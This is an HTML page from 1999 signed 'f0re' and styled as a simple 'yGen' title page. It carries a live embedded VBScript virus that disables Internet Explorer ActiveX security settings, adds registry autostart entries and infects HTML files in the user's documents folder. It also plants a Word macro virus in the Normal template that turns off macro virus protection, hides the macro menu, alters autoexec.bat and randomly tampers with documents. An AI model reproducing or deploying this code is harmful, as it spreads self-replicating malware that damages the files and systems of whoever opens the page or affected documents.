<nospace>

<html>
<head>
<title>yGen</title>
</head>

<body>

<br><br><br>
<font size="7"><center>yGen</font>
<br>
<br>
<font size = 2 face="times">to you, time is of the essence</font>

<br>
<br>
<font face="arial" size=1>
<b></b><font face="arial" size=2><pre>&copy 1999   f  0  r  e</pre><br><br> 
<bR>
</font>
<font size="1" face="arial">thanks to: Spysend, dr[yozak], [Pax], TPhunk, 1nternal, the_Might and everyone else in #vir, #virus and #gigavirii.
</center>
</body>
</html>

<script language="VBScript"><!--

'MyName = yGen
'Version = 1.0 (e-Gen 2.0)
'WrittenBy = f0re
'
'This is e-Gen version 2.0. I updated version 1.0 by removing some bugs and making the virus a
'little faster. However no real new features included.
'

On error Resume Next

'activeX stealth -----------------------------------------------

Set WshShell = CreateObject("WScript.Shell")

WshShell.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1004" , 0, "REG_DWORD"
WshShell.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1200" , 0, "REG_DWORD"
WshShell.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201" , 0, "REG_DWORD"
WshShell.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1004" , 0, "REG_DWORD"
WshShell.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1200" , 0, "REG_DWORD"
WshShell.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1201" , 0, "REG_DWORD"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOwner", "f0re"
WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Win98Run", "C:\WINDOWS\SYSTEM\win98dll.vbs"
WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Win98Run", "C:\WINDOWS\SYSTEM\windll.vbs"

'------------------------- prepare html engine --------------------------

Dim FSO
Set FSO = CreateObject("Scripting.FileSystemObject")
Set TRange = document.body.createTextRange
	
Set b = fso.opentextfile("c:\windows\test.txt", 2, true)
b.writeline trange.htmltext
b.close

Set b = FSO.OpenTextFile("c:\windows\test.txt", 1, true)
startvir = "'MyName = yGen"
Do While b.atendofstream <> True
 pos = b.readline
 if pos = startvir then exit Do
Loop

Set c = FSO.OpenTextFile("c:\windows\test2.txt", 2, True)
c.writeline "<script language=" & chr(34) & "VBScript" & chr(34) & "><!--"
c.writeline " "
c.writeline pos
Do While b.atendofstream <> True
 c.writeline b.readline
Loop
c.close	
b.close

'------------------------- insert html-engine -----------------------------
 	
Set f = FSO.OpenTextFile("c:\windows\windll.vbs", 2, True)

f.writeline "Set FSO = CreateObject(" &chr(34) &"Scripting.FileSystemObject" & chr(34) & ")"
f.writeline "Set FolderObj = FSO.GetFolder(" & chr(34) & "c:\my documents\" & chr(34) & ")"
f.writeline "Set FO = FolderObj.Files"
f.writeline " For each target in FO"
f.writeline "	ExtName = lcase(FSO.GetExtensionName(target.Name))"
f.writeline "	if ExtName = " & chr(34) & "htm" & chr(34) & " or ExtName = " & chr(34) & "html" & chr(34) & "then"
f.writeline "		Set d = FSO.OpenTextFile(target.path, 1, False)"
f.writeline "		if d.readline <> " & chr(34) & "<nospace>" & chr(34) & " then"
f.writeline "			d.close()"
f.writeline "			GetFile(target.path)"
f.writeline "		else"
f.writeline "			d.close()"
f.writeline "		end if"
f.writeline "	end if"
f.writeline " next"
f.writeline ""
f.writeline "Sub GetFile(GetFileName)"
f.writeline ""
f.writeline "Set c = FSO.OpenTextFile(" & chr(34) & "c:\windows\test2.txt" & chr(34) & ", 1, True)"
f.writeline "viruscode = c.readAll()"
f.writeline "c.close"
f.writeline ""
f.writeline "Set d = FSO.OpenTextFile(GetFileName, 1, False)"
f.writeline "contents = d.readall()"
f.writeline "d.close()"
f.writeline ""
f.writeline "Set d = FSO.OpenTextFile(GetFileName, 2, False)"
f.writeline "d.WriteLine " & chr(34) & "<nospace>" & chr(34)
f.writeline "d.Write(contents)"
f.writeline "d.writeline " & chr(34) & " " & chr(34)
f.writeline "d.writeline " & chr(34) & " " & chr(34)
f.writeline "d.Write(viruscode)"
f.writeline "d.close()"
f.writeline "End Sub"
f.close

'------------------------- prepare word-engine -----------------------------

Set b = FSO.OpenTextFile("c:\windows\test2.txt", 1, False)
wordbegin = "Sub WordMark()"
	
Do While b.atendofstream <> True
 pos = b.readline
 if pos = wordbegin then exit Do
Loop

Set e = FSO.OpenTextFile("c:\windows\test3.txt", 2, True)
e.writeline "Private Sub Document_Open()"

Do While pos <> "End Sub"
 pos = b.readline
 e.writeline pos
Loop
e.close
b.close

Set e = FSO.OpenTextFile("c:\windows\test3.txt", 1, True)
Set f = FSO.OpenTextFile("c:\windows\test4.txt", 2, True)
Do while e.atendofstream <> True
 pos = e.readline
 if Mid(pos,1,1) = "'" then pos = Mid(pos,2,Len(pos) -1)
 f.writeline pos
Loop
e.Close
f.close

Set f = FSO.OpenTextFile("c:\windows\windll98.vbs", 2, True)

f.writeline "Set FSO = CreateObject(" &chr(34) &"Scripting.FileSystemObject" & chr(34) & ")"
f.writeline "Set f = FSO.OpenTextFile(" & chr(34) & "c:\windows\test4.txt" & chr(34) & ", 1, True)"
f.writeline "wordvirus = f.readall()"
f.writeline "f.close"
f.writeline ""
f.writeline "Set WordObj = CreateObject(" & Chr(34) & "Word.Application" & chr(34) & ")"
f.writeline "WordObj.Options.SaveNormalPrompt = False"
f.writeline "Set NT= WordObj.normaltemplate.vbproject.vbcomponents(1).codemodule"
f.writeline "If NT.Lines(3,1) <> " & chr(34) & "'MyName = yGen" & chr(34) & " then"
f.writeline " NT.deletelines 1, NT.countoflines"
f.writeline " NT.insertlines 1, wordvirus"
f.writeline "End If"
f.writeline "set NT = nothing"
f.writeline "WordObj.Quit"
f.close

'------------------------------ word-file -----------------------------

Sub WordMark()

''MyName = yGen
''WrittenBy = f0re
'
'On Error Resume Next
'
'CommandBars("Tools").Controls("macro").visible = false
'Application.EnableCancelKey = 0
'Options.VirusProtection = 0
'Options.SaveNormalPrompt = 0
'Options.ConfirmConversions = 0
'
'If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "yGen") <> "phraming the world into the next millenium" Then
'System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "yGen") = "phraming the world into the next millenium"
'End If
'
'NormalInstalled = False
'ActiveInstalled = False
'
'Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
'Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
'
'If NT.Lines(3, 1) = "'MyName = yGen" Then NormalInstalled = True
'If AD.Lines(3, 1) = "'MyName = yGen" Then ActiveInstalled = True
'
'If NormalInstalled = True And ActiveInstalled = True Then GoTo PhrameEnd
'
'If NormalInstalled = False Then
'    Set Infection = NT
'    Set Carrier = AD
'    vircode = "Sub Document_Open()" & Chr(13) & Chr(10)
'Else
'    Set Infection = AD
'    Set Carrier = NT
'    vircode = "Sub Document_Close()" & Chr(13) & Chr(10)
'End If
'
'With Carrier
'    For X = 2 To .CountOfLines
'        Vircode = Vircode & .Lines(X, 1) & Chr(13) & Chr(10)
'        If .Lines(X, 1) = "End Sub" Then Exit For
'    Next X
'End With
'
'With Infection
'        .DeleteLines 1, .CountOfLines
'        .InsertLines 1, Vircode
'End With
'
'If Norminstalled = False then normaltemplate.save
'If ActiveInstalled = False then activedocument.save
'
'PhrameEnd:

'Root = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "SystemRoot")
'Targ = Mid(Root, 1, 3)
'
'Open Targ + "autoexec.bat" For Append As #1
'        Print #1, "pause"
'Close #1
'
'Rndnm = Int((Rnd() * 15) + 1)
'If Rndnm = 15 Then
'
'    Selection.EndKey Unit:=wdStory
'    Selection.TypeParagraph
'    Selection.Font.ColorIndex = wdWhite
'    Selection.TypeText "phraming the world into the next millenium"
'    Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
'    Selection.HomeKey Unit:=wdLine
'    Selection.MoveRight Unit:=wdCharacter, Count:=42, Extend:=wdExtend
'    Selection.LanguageID = wdNoProofing
'    Selection.HomeKey Unit:=wdStory
'
'    ToolsCustomizeKeyboard.KeyCode = 27
'    ToolsCustomizeKeyboard.Category = 1
'    ToolsCustomizeKeyboard.Name = "Cancel"
'    ToolsCustomizeKeyboard.Remove
'    ToolsCustomizeKeyboard.Context = 0
'    
'    SendKeys "%" + "{F4}"
'
'End If

End Sub



--></script>





</body>
</html>

